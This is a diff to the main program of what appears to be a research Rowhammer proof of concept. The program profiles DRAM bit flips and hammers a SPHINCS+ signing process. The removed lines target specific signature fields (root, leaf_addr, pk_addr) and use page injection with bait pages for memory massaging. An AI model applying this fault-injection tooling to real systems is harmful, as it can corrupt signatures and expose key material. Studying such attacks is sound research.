@@ -1,6 +1,4 @@
 use std::{
-    collections::HashMap,
-    fmt::Debug,
     fs::File,
     io::{stdin, BufReader, BufWriter, Write},
     ops::Range,
@@ -8,11 +6,13 @@ use std::{
 };
 
 use anyhow::bail;
+use bs_poc::hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper};
+use bs_poc::hammerer::Hammering;
+use bs_poc::memory::{mem_configuration::MemConfiguration, GetConsecPfns};
 use bs_poc::{
     allocator::hugepage::HugepageAllocator,
-    hammerer::{make_hammer, HammerStrategy},
-    memory::{find_flippy_page, BitFlip, DataPattern, Initializable, VictimMemory},
-    util::PAGE_SHIFT,
+    hammerer::{make_hammer, HammerResult, HammerStrategy},
+    memory::{BitFlip, DataPattern, Initializable, VictimMemory},
     victim::{HammerVictimError, VictimResult},
 };
 use bs_poc::{
@@ -25,15 +25,6 @@ use bs_poc::{
     hammerer::Hammerer,
 };
 use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
-use bs_poc::{
-    hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper},
-    memory::PfnResolver,
-};
-use bs_poc::{hammerer::Hammering, victim::InjectionConfig, victim::PageInjector};
-use bs_poc::{
-    memory::{mem_configuration::MemConfiguration, GetConsecPfns},
-    util::PAGE_SIZE,
-};
 use bs_poc::{
     memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
     retry,
@@ -99,13 +90,13 @@ struct CliArgs {
     statistics: Option<String>,
     /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
     #[command(subcommand)]
-    target: Target,
+    target: Option<Target>,
 }
 
 #[derive(Clone, Debug, Subcommand, Serialize)]
 enum Target {
     SphincsPlus { binary: String },
-    MemCheck,
+    None,
 }
 
 /// The type of allocation strategy to use.
@@ -285,68 +276,23 @@ fn hammer_profile(
     Profiling { rounds }
 }
 
-// find profile entry with bitflips in needed range
-#[derive(Clone, Debug, Serialize)]
-struct TargetOffset {
-    description: String,
-    page_offset: usize,
-    stack_offset: usize,
-    target_size: usize,
-}
-fn filter_flips<'a>(
-    bit_flips: Vec<&'a BitFlip>,
-    targets: &[TargetOffset],
-) -> Vec<(&'a BitFlip, TargetOffset)> {
-    bit_flips
-        .into_iter()
-        .filter_map(|candidate| {
-            let pg_offset = candidate.addr & 0xfff;
-            let matched = targets.iter().find(|&target| {
-                let addr = target.page_offset & 0xfff;
-                addr <= pg_offset && pg_offset < addr + target.target_size
-            });
-            if matched.is_some() {
-                info!("Matched candidate {:?} to target {:?}", candidate, matched);
-            }
-            matched.map(|offset| (candidate, offset.clone()))
-        })
-        .collect_vec()
+#[derive(Serialize)]
+enum ExperimentData<T> {
+    Error { date: String, error: String },
+    Results { date: String, results: T },
 }
 
-#[derive(Serialize)]
-struct ExperimentData<T> {
-    date: String,
-    error: Option<String>,
-    hammer_results: Option<T>,
-    target_page: Option<usize>,
-    target_offset: Option<TargetOffset>,
-}
 impl<T> ExperimentData<T> {
-    fn error(msg: String) -> Self {
-        Self {
+    fn error(error: String) -> Self {
+        Self::Error {
             date: chrono::Local::now().to_rfc3339(),
-            error: Some(msg),
-            hammer_results: None,
-            target_page: None,
-            target_offset: None,
+            error,
         }
     }
-    fn error_with_page(msg: String, target_page: usize, target_offset: TargetOffset) -> Self {
-        Self {
+    fn results(results: T) -> Self {
+        Self::Results {
             date: chrono::Local::now().to_rfc3339(),
-            error: Some(msg),
-            hammer_results: None,
-            target_page: Some(target_page),
-            target_offset: Some(target_offset),
-        }
-    }
-    fn results(results: T, target_page: usize, target_offset: TargetOffset) -> Self {
-        Self {
-            date: chrono::Local::now().to_rfc3339(),
-            error: None,
-            hammer_results: Some(results),
-            target_page: Some(target_page),
-            target_offset: Some(target_offset),
+            results,
         }
     }
 }
@@ -388,7 +334,7 @@ unsafe fn _main() -> anyhow::Result<()> {
     }
     let mut stats = vec![];
 
-    let mut results: Vec<ExperimentData<VictimResult>> = vec![];
+    let mut results: Vec<ExperimentData<HammerResult>> = vec![];
     'repeat: for _ in 0..repetitions {
         if let Some(timeout) = timeout {
             if std::time::Instant::now() - start > timeout {
@@ -429,6 +375,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             .rounds
             .iter()
             .flat_map(|r| r.bit_flips.iter())
+            .cloned()
             .collect::<Vec<_>>();
         // write stats
         if let Some(stats_file) = &args.statistics {
@@ -466,48 +413,19 @@ unsafe fn _main() -> anyhow::Result<()> {
             info!("Profiling done. Found bitflips in {:?}", bit_flips);
         }
 
-        let targets = [
-            // attack root[SPX_N] for 256s
-            TargetOffset {
-                description: "root[SPX_N] 256s".to_string(),
-                page_offset: 0xec0,
-                stack_offset: 31,
-                target_size: 32,
-            },
-            /*
-            // attack stack for 256s
-            TargetOffset {
-                description: "stack 256s".to_string(),
-                page_offset: 0x700,
-                stack_offset: 31,
-                target_size: 448,
-            },
-            // attack stack for 256s
-            TargetOffset {
-                description: "stack 256s".to_string(),
-                page_offset: 0xa10,
-                stack_offset: 31,
-                target_size: 256,
-            },
-            */
-            // attack leaf_addr (22 byte) for 256s
-            TargetOffset {
-                description: "leaf_addr 256s".to_string(),
-                page_offset: 0xc68,
-                stack_offset: 31,
-                target_size: 22,
-            },
-            // attack pk_addr (22 byte) for 256s
-            TargetOffset {
-                description: "pk_addr 256s".to_string(),
-                page_offset: 0xc48,
-                stack_offset: 31,
-                target_size: 22,
-            },
-        ];
-        // the number of bait pages to release after the target page (for memory massaging)
-        let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);
+        let addrs = bit_flips.iter().map(|f| f.addr).collect_vec();
 
+        let mut victim = match make_victim(args.target.clone().unwrap_or(Target::None), addrs) {
+            Ok(victim) => victim,
+            Err(e) => {
+                results.push(e);
+                memory.dealloc();
+                continue 'repeat;
+            }
+        };
+
+        // TODO reproduce, filter for reproducible flips
+        /*
         // Find address to use for injection by majority vote
         let (target_addr, target_offset) = match filter_flips(bit_flips, &targets).last().cloned() {
             Some((flip, offset)) => (flip.addr, offset),
@@ -560,34 +478,19 @@ unsafe fn _main() -> anyhow::Result<()> {
                 continue;
             }
         }
+        */
+        let dpattern = profiling
+            .rounds
+            .iter()
+            .find(|r| {
+                r.bit_flips
+                    .iter()
+                    .any(|b| b.addr == victim.target_addr() as usize)
+            })
+            .map(|r| r.pattern.clone())
+            .expect("no round with flips in addr");
         memory.initialize(dpattern.clone());
-
-        let target_page = target_addr & !0xfff; // mask out the lowest 12 bits
-
-        let injection_config = InjectionConfig {
-            flippy_page: target_page as *mut libc::c_void,
-            flippy_page_size: PAGE_SIZE,
-            bait_count_after: bait_count_after
-                .get(&target_offset.stack_offset)
-                .copied()
-                .expect("unsupported stack offset"),
-            bait_count_before: 0,
-        };
-        let mut victim = match make_victim(
-            args.target.clone(),
-            &memory,
-            dpattern.clone(),
-            target_addr,
-            target_offset.clone(),
-            injection_config,
-        ) {
-            Ok(victim) => victim,
-            Err(e) => {
-                results.push(e);
-                continue 'repeat;
-            }
-        };
-
+        victim.start();
         let hammer = make_hammer(
             &args.hammerer,
             &pattern.pattern,
@@ -599,32 +502,20 @@ unsafe fn _main() -> anyhow::Result<()> {
             false,
             None,
         )?;
-        for _ in 0..100 {
+        for _ in 0..10 {
             let result = hammer.hammer(&mut victim);
             match result {
                 Ok(result) => {
                     info!("Hammering successful: {:?}", result.victim_result);
-                    results.push(ExperimentData::results(
-                        result.victim_result,
-                        target_page,
-                        target_offset.clone(),
-                    ));
+                    results.push(ExperimentData::results(result));
                 }
                 Err(HammerVictimError::NoFlips) => {
                     warn!("No flips detected");
-                    results.push(ExperimentData::error_with_page(
-                        "No flips detected".to_string(),
-                        target_addr,
-                        target_offset.clone(),
-                    ));
+                    results.push(ExperimentData::error("No flips detected".to_string()));
                 }
                 Err(e) => {
                     warn!("Hammering failed: {:?}", e);
-                    results.push(ExperimentData::error_with_page(
-                        format!("Hammering failed: {:?}", e),
-                        target_addr,
-                        target_offset.clone(),
-                    ));
+                    results.push(ExperimentData::error(format!("Hammering failed: {:?}", e)));
                     break;
                 }
             }
@@ -641,7 +532,7 @@ unsafe fn _main() -> anyhow::Result<()> {
     #[derive(Serialize)]
     struct ExperimentResult {
         args: CliArgs,
-        results: Vec<ExperimentData<VictimResult>>,
+        results: Vec<ExperimentData<HammerResult>>,
     }
     let res = ExperimentResult { args, results };
     let mut json_file = BufWriter::new(File::create(results_file)?);
@@ -651,63 +542,15 @@ unsafe fn _main() -> anyhow::Result<()> {
 }
 
 #[allow(clippy::result_large_err)]
-fn make_victim(
-    target: Target,
-    memory: &dyn VictimMemory,
-    dpattern: DataPattern,
-    target_addr: usize,
-    target_offset: TargetOffset,
-    injection_config: InjectionConfig,
-) -> Result<Victim, ExperimentData<VictimResult>> {
+fn make_victim(target: Target, addrs: Vec<usize>) -> Result<Victim, ExperimentData<HammerResult>> {
     match target {
-        Target::MemCheck => {
-            let victim = victim::MemCheck::new(memory, dpattern);
-            Ok(Victim::MemCheck(victim))
-        }
-        Target::SphincsPlus { binary } => {
-            let target_pfn = (target_addr as *const u8).pfn().expect("no pfn") >> PAGE_SHIFT;
-            let stack_offset = target_offset.stack_offset;
-            let injector = PageInjector::new(injection_config);
-            let victim = victim::SphincsPlus::new(binary, injector).map_err(|e| {
-                warn!("Failed to create victim: {:?}", e);
-                ExperimentData::error(format!("Failed to create victim: {:?}", e))
-            })?;
-            let flippy_page = find_flippy_page(target_pfn, victim.pid());
-            match flippy_page {
-                Ok(Some(flippy_page)) => {
-                    info!("Flippy page found: {:?}", flippy_page);
-                    if flippy_page.region_offset != stack_offset {
-                        warn!(
-                            "Flippy page offset mismatch: {} != {}",
-                            flippy_page.region_offset, stack_offset
-                        );
-                        victim.stop();
-                        return Err(ExperimentData::error_with_page(
-                            format!(
-                                "Flippy page offset mismatch: {} != {}",
-                                flippy_page.region_offset, stack_offset
-                            ),
-                            target_addr,
-                            target_offset.clone(),
-                        ));
-                    }
-                    return Ok(Victim::SphincsPlus(victim));
-                }
-                Ok(None) => {
-                    warn!("Flippy page not found");
-                    victim.stop();
-                    Err(ExperimentData::error("Flippy page not found".to_string()))
-                }
-                Err(e) => {
-                    warn!("Error finding flippy page: {:?}", e);
-                    victim.stop();
-                    Err(ExperimentData::error(format!(
-                        "Error finding flippy page: {:?}",
-                        e
-                    )))
-                }
-            }
-        }
+        Target::SphincsPlus { binary } => Ok(Victim::SphincsPlus(
+            victim::SphincsPlus::new(binary, addrs).map_err(|e| {
+                warn!("Failed to create victim: {}", e);
+                ExperimentData::error(format!("Failed to create victim: {}", e))
+            })?,
+        )),
+        Target::None => Err(ExperimentData::error("No target specified".to_string())),
     }
 }
 
@@ -740,36 +583,40 @@ fn reproduce_pattern<H: Hammering>(
     Ok(success)
 }
 
-enum Victim<'a> {
-    MemCheck(victim::MemCheck<'a>),
+#[derive(Serialize)]
+enum Victim {
     SphincsPlus(victim::SphincsPlus),
 }
+impl Victim {
+    // TODO refactor to trait
+    fn target_addr(&self) -> *const libc::c_void {
+        match self {
+            Victim::SphincsPlus(v) => v.target_addr(),
+        }
+    }
+}
 
-impl<'a> HammerVictim for Victim<'a> {
+impl HammerVictim for Victim {
     fn start(&mut self) {
         match self {
-            Victim::MemCheck(v) => v.start(),
             Victim::SphincsPlus(v) => v.start(),
         }
     }
 
     fn init(&mut self) {
         match self {
-            Victim::MemCheck(v) => v.init(),
             Victim::SphincsPlus(v) => v.init(),
         }
     }
 
     fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
         match self {
-            Victim::MemCheck(v) => v.check(),
             Victim::SphincsPlus(v) => v.check(),
         }
     }
 
-    fn stop(self) {
+    fn stop(&mut self) {
         match self {
-            Victim::MemCheck(v) => v.stop(),
             Victim::SphincsPlus(v) => v.stop(),
         }
     }
@@ -777,62 +624,4 @@ impl<'a> HammerVictim for Victim<'a> {
 
 fn main() -> anyhow::Result<()> {
     unsafe { _main() }
-}
-
-#[cfg(test)]
-mod test {
-    use bs_poc::memory::BitFlip;
-
-    use crate::{filter_flips, TargetOffset};
-
-    #[test]
-    fn test_filter_flips_match_start() {
-        let flips = [BitFlip {
-            addr: 0x700,
-            bitmask: 0x1,
-            data: 0xff,
-        }];
-        let targets = [TargetOffset {
-            description: "test_filter_flips_match_start".to_string(),
-            page_offset: 0x700,
-            stack_offset: 31,
-            target_size: 32,
-        }];
-        let filtered = filter_flips(flips.iter().collect(), &targets);
-        assert_eq!(filtered.len(), 1);
-    }
-
-    #[test]
-    fn test_filter_flips_match_end() {
-        let flips = [BitFlip {
-            addr: 0x700,
-            bitmask: 0x1,
-            data: 0xff,
-        }];
-        let target = TargetOffset {
-            description: "test_filter_flips_match_end".to_string(),
-            page_offset: 0x600,
-            stack_offset: 31,
-            target_size: 0x101,
-        };
-        let filtered = filter_flips(flips.iter().collect(), &[target]);
-        assert_eq!(filtered.len(), 1);
-    }
-
-    #[test]
-    fn test_filter_flips_nomatch() {
-        let flips = [BitFlip {
-            addr: 0x700,
-            bitmask: 0x1,
-            data: 0xff,
-        }];
-        let target = TargetOffset {
-            description: "test_filter_flips_nomatch".to_string(),
-            page_offset: 0x600,
-            stack_offset: 31,
-            target_size: 0x100,
-        };
-        let filtered = filter_flips(flips.iter().collect(), &[target]);
-        assert_eq!(filtered.len(), 0);
-    }
 }
